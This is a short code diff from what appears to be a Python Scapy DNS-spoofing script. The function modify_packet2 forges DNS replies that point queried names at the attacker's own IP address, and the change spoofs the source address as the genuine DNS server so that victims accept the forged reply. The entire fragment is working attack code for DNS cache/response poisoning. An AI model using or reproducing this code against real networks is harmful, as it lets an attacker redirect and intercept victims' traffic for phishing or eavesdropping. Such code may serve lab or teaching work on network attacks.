@@ -90,7 +90,7 @@ def modify_packet2(packet):
         return packet
     #We set the answerfield of the response to our own IP-addres
 
-    new_packet = IP(dst=packet[IP].src)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id,qd=packet[DNS].qd,qr=1,ancount=1,an=DNSRR(rrname=qname, ttl=100,rdata=dns_map[qname]))
+    new_packet = IP(dst=packet[IP].src, src=packet[IP].dst)/UDP(dport=packet[UDP].sport, sport=53)/DNS(id=packet[DNS].id,qd=packet[DNS].qd,qr=1,ancount=1,an=DNSRR(rrname=qname, ttl=100,rdata=dns_map[qname]))
     iPrint("Modified:", qname)
     iPrint(new_packet.summary())
     iPrint(new_packet[DNS].summary())
